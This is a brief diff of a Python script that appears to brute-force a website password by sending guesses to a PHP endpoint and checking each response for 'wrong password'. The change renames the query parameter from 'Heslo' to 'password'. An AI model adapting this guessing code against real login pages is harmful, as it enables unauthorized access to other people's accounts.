@@ -4,7 +4,7 @@ import requests
 import concurrent.futures
 
 def check_website(password):
-    r = requests.get("http://website.com/req.php?Heslo="+str(password))
+    r = requests.get("http://website.com/req.php?password="+str(password))
     if r.text == "wrong password":
         print "I'm not found password "+ str(password)
         #return "I'm testing password '" + str(password) + "' It's wrongs :("
